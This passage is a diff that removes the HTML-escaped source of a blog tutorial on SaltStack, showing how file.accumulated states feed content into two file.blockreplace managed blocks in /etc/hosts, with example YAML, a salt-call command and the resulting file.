-&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;extra-settings-example-virtualhost-maindir&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;-     &lt;span class=&quot;k&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;-   &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;- &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;And to get the right number of spaces on the resulting file use the indent filter:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-jinja&quot; data-lang=&quot;jinja&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;indent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;h2&gt;file.blockreplace using file.accumulated&lt;/h2&gt;
-
-&lt;p&gt;Now if you read the &lt;a href=&quot;/saltstack/english/2014/01/20/saltstack_step_by_step_file_blockreplace/&quot;&gt;previous post on &lt;code&gt;file.blockreplace&lt;/code&gt;&lt;/a&gt; you may wonder how to use it with accumulators. It will differ a little from the &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.managed&quot;&gt;&lt;code&gt;file.managed&lt;/code&gt;&lt;/a&gt; usage of accumulators.&lt;/p&gt;
-
-&lt;p&gt;With &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.managed&quot;&gt;&lt;code&gt;file.managed&lt;/code&gt;&lt;/a&gt; you have this &lt;em&gt;accumulator&lt;/em&gt; jinja variable and several keys inside. With &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.blockreplace&quot;&gt;&lt;code&gt;file.blockreplace&lt;/code&gt;&lt;/a&gt; you have nothing to do.&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;If one accumulator is targeted on the same file (the same as the one targeted by the blockreplace), then the blockreplace &lt;code&gt;content&lt;/code&gt; attribute will be filled with all the lines contained on this accumulator. Any data directly set in the content attribute is not loose, accumulator data is only added, but the content attribute is not required so it could also be empty.&lt;/li&gt;
-&lt;li&gt;If several accumulators are targeted on this file they will be merged, but if you use several blockreplace states on the same file the accumulators are merged using the requisites dependencies you've made and accumulators names.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-&lt;p&gt;This last sentence is maybe weird. We'll make an example to see it, but another way of saying that is that it's magical and it should do the things you think it should do (if not, make bug reports).&lt;/p&gt;
-
-&lt;p&gt;So in this example we'll reuse the last example of managing entries in an &lt;code&gt;/etc/hosts&lt;/code&gt; file. But we will manage two blocks of edition. So we have theses two states in an &lt;code&gt;hostsedit_acc.sls&lt;/code&gt; file:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;test-etc-hosts-blockreplace-services-local&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;file.blockreplace&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;/etc/hosts&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;marker_start&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;#&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;BLOCK&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;TOP&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;salt&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;managed&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;zone&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;please&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;not&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;edit&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;marker_end&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;#&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;BLOCK&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;BOTTOM&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;salt&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;managed&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;zone&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;show_changes&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;True&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;append_if_not_found&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;True&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt; &lt;span class=&quot;-Error&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;l-Scalar-Plain&quot;&gt;test-etc-hosts-blockreplace-services-central&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;file.blockreplace&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;/etc/hosts&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;marker_start&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;#&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;BLOCK&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;TOP&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;salt&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;managed&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;zone&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;central&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;please&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;not&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;edit&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;marker_end&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;#&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;BLOCK&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;BOTTOM&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;central&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;salt&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;managed&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;zone&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;show_changes&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;True&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;append_if_not_found&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;True&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Same blocks as in the &lt;a href=&quot;/saltstack/english/2014/01/20/saltstack_step_by_step_file_blockreplace/&quot;&gt;previous guide&lt;/a&gt; on blockreplace. But there I removed the content attribute (it &lt;em&gt;could&lt;/em&gt; work with a content attribute adding more static stuff, but I do not need it).&lt;/p&gt;
-
-&lt;p&gt;So now if I want to use &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.accumulated&quot;&gt;&lt;code&gt;file.accumulated&lt;/code&gt;&lt;/a&gt; to push some content in theses blocks I just need to do two things:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;target the blockreplace state id in a requisite to ensure my current state will run before&lt;/li&gt;
-&lt;li&gt;target the same file (name attribute)&lt;/li&gt;
-&lt;/ul&gt;
-
-
-&lt;p&gt;Quite simple, but here we have &lt;strong&gt;two&lt;/strong&gt; managed blocks, my accumulated content will be set in the block targeted by my requisite.&lt;/p&gt;
-
-&lt;p&gt;Let's try it in a second sls file: &lt;code&gt;hosts_data.sls&lt;/code&gt;, but you could split that on more files if everything gets included at the end:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;p-Indicator&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# Include dependencies #}&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- hostsedit_acc&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;hostadata1-external-google-dns&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;file.accumulated&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- filename&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;/etc/hosts&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- text&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;8.8.8.8 ns1.google.com&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;8.8.8.4 ns2.google.com&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;test-etc-hosts-blockreplace-services-central&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;hostadata2-external-thing&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;file.accumulated&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- filename&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;/etc/hosts&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- text&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;93.184.216.119&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;www.example.com&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;19&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;test-etc-hosts-blockreplace-services-central&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;20&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt;21&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;hostdata3-internal-stuff1&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;22&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;file.accumulated&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- filename&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;/etc/hosts&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;24&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- text&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;127.0.0.1&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;bar&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;foo.local.net&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;bar.local.net&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;25&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;26&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;test-etc-hosts-blockreplace-services-local&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;27&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt;28&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;hostdata4-internal-stuff2&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;29&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;file.accumulated&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;30&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- filename&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;/etc/hosts&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;31&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- text&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;32&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;127.0.0.1 db.local.net&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;33&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;127.0.0.1 http.local.net&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;34&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;127.0.0.1 foobar&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;35&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;36&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;test-etc-hosts-blockreplace-services-local&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Note that I did not use the &lt;code&gt;name&lt;/code&gt; attribute in theses states. Using name I could name the dictionary key, or we could say I would set the accumulator name. I could use names, but using the same accumulator name with the four states, strange things would happen, data from all theses accumulators would be merged in the same accumulator name. So, either avoid name attributes or use it with different names if the targeted blockedit is different. And test your recipes :-)&lt;/p&gt;
-
-&lt;p&gt;Now run it with:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;salt-call -linfo state.sls hosts_data&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;You should get theses two managed blocks in &lt;code&gt;/etc/hosts&lt;/code&gt;, filled from several states:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# BLOCK TOP : salt managed zone : local services : please do not edit&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     127.0.0.1 foo bar foo.local.net bar.local.net
-&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;     127.0.0.1 db.local.net
-&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;     127.0.0.1 http.local.net
-&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;     127.0.0.1 foobar
-&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;# BLOCK BOTTOM : local : end of salt managed zone --&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;# BLOCK TOP : salt managed zone : central services : please do not edit    &lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;     93.184.216.119 : www.example.com
-&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;     8.8.8.8 ns1.google.com
-&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;     8.8.8.4 ns2.google.com
-&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;# BLOCK BOTTOM : central : end of salt managed zone --&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;h2&gt;Last words&lt;/h2&gt;
-
-&lt;p&gt;Note that this example is based on the development github repository of salt. You may not be able to run theses examples on versions prior to 0.18.0. The multiple blockreplace case is one of the last fix added by @kiorky.
